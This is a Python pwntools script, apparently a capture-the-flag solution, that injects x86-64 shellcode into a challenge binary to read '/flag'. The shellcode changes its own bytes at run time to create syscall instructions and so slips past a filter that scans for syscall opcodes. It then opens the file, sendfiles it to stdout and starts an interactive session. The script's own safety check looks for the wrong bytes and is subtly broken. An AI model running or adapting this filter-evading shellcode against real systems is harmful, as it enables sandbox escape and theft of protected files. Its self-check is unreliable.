#!/usr/bin/env python3
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = "debug"

target_binary = "/challenge/syscall-smuggler"

shellcode_asm = """
.section .shellcode,"awx"
.global _start
.global __start
_start:
__start:
.intel_syntax noprefix
.p2align 0
    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0x67616c662f
    xor [rsp], rax
    push 2
    pop rax
    mov rdi, rsp
    xor esi, esi
    inc byte ptr [rip + patch_target1 + 1]
patch_target1:
    .byte 0x0f
    .byte 0x04

    mov r10d, 0x7fffffff
    mov rsi, rax
    push 40
    pop rax
    push 1
    pop rdi
    cdq
    inc byte ptr [rip + patch_target + 1]
patch_target:
    .byte 0x0f
    .byte 0x04
"""

payload = asm(shellcode_asm)
print(payload)

log.info(f"Payload len: {len(payload)} bytes")
log.info(f"Payload Hex dump: \n{enhex(payload)}")

if b"\x0f05" in payload:
    log.error("detected syscall bytes in payload")
    exit(1)

p = process(target_binary)
p.send(payload)
p.interactive()
